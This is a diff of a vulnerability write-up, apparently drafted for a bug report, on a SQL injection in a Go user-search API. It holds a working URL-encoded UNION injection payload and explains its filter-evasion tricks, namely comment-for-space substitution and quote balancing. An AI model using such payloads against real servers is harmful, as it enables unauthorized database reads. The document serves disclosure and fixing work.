@@ -229,7 +229,8 @@ func SearchUserByName(opt SearchOption) (us []*User, err error) {
     return us, err
 }
 ```
-proposed fix
+
+Proposed fix is to use a prepared statement, instead of a simple string concatenation
 ```go
 err = x.Limit(opt.Limit).Where("type=0").And("lower_name like ?", "%" + opt.Keyword + "%").Find(&us)
 ```
@@ -239,18 +240,18 @@ The query is done with XORM - eXtra ORM for Go, ORM stands for Object-Relational
 select * from user where (type=0 and lower_name like '%<keyword>%');
 ```
 
-That's the proof of concept, in the report, we'll need to tweak it as their instance is using mysql  
+That's the proof of concept, in the report, we'll need to tweak it as it's using mysql and not sqlite
 ```
 http://www.example.com/api/v1/users/search?q='/**/and/**/false)/**/union/**/select/**/null,null,@@version,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null/**/from/**/mysql.db/**/where/**/('%25'%3D'
 ```
 
-playing on the local instance:
-union all does not drop duplicates
-@@version of courlse is only relevant for mysql, since  we're working on a sqlite.db we can use `select sqlite_version()`
-%25 = "%"  
-%3D = "="
-`'%25'%3D` is `'%'=` to escape the `%'` at the end, so that the where clause is `'%'='%'` meaning it's always true
-`/**/` are empty comments, but will work as spaces if it was just a urlencode issue we could have used + but the code actually filters down spaces 
+playing on the local instance:  
+union all does not drop duplicates  
+@@version of course is only relevant for mysql, since  we're working on a sqlite.db we can use `select sqlite_version()`  
+%25 = "%"   
+%3D = "="  
+`'%25'%3D` is `'%'=` to escape the `%'` at the end, so that the where clause is `'%'='%'` meaning it's always true   
+`/**/` are empty comments, but will work as spaces if it was just a urlencode issue we could have used + but the code actually filters down spaces   
 
 We got it working on the sqlite3 cli:
 ```
